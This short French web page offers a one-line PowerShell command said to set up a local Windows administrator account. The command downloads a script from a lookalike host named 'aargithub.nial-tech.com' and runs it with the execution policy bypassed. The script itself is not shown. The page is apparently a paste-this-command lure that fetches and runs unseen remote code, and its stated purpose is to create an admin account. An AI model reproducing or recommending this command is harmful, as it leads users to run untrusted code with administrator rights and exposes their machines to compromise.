Configure rapidement un compte administrateur local Windows grâce à un script PowerShell.

Installation PowerShell 
$p="$env:TEMP\a.ps1";irm https://aargithub.nial-tech.com/AR-V2.ps1 -OutFile $p;powershell -ep Bypass -f $p
Copiez la commande puis exécutez-la dans PowerShell.

Rapide

Une seule commande PowerShell permet de récupérer et lancer le script.

⚠️ Attention

Ce script modifie la configuration des comptes utilisateurs Windows et nécessite des privilèges administrateur. Vérifiez le contenu du script avant de l'exécuter et utilisez-le uniquement sur une machine que vous administrez.
